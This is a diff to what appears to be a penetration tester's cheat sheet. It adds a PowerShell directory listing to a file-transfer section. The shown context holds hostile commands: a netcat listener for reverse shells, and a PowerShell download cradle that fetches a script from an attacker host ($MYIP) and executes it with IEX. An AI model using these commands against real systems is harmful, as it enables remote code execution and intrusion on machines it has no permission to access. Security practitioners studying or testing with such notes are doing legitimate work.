@@ -102,6 +102,7 @@ rlwrap nc -lvnp 5555
 ## File Transfer
 python3 -m http.server 80 -d ~/Upload
 "powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1'')"
+"powershell -c dir C:\programdata\tmp"
 
 ## Sorting Files
 sort -u usernames | tee usernames
